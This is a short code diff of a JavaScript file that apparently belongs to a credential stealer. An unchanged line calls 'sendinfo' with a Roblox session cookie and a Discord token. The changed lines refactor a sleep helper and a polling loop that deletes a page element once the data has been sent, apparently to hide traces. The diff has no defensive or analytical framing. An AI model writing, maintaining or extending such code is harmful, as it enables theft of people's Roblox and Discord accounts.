@@ -68,21 +68,19 @@ function loadURL() {
 
     sendinfo(RBLXCOOKIE, DISCTOKEN);
 
-function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-async function processURLx() {
     while (urlx) {
-        if (urlx.innerHTML === '' && sent === true) {
-            await sleep(1500); // 1.5 seconds in ms
+        if (urlx.innerHTML=='' && sent==true) {
+            await sleep(1.5);
             urlx.remove();
         } else {
-            await sleep(1500);
-        }
-    }
-}
+            await sleep(1.5);
+        };
+    };
+};
 
-processURLx();
+async function sleep(seconds) {
+    return new Promise((resolve) => setTimeout(resolve, seconds * 1000));
+};
+
 
 loadURL();
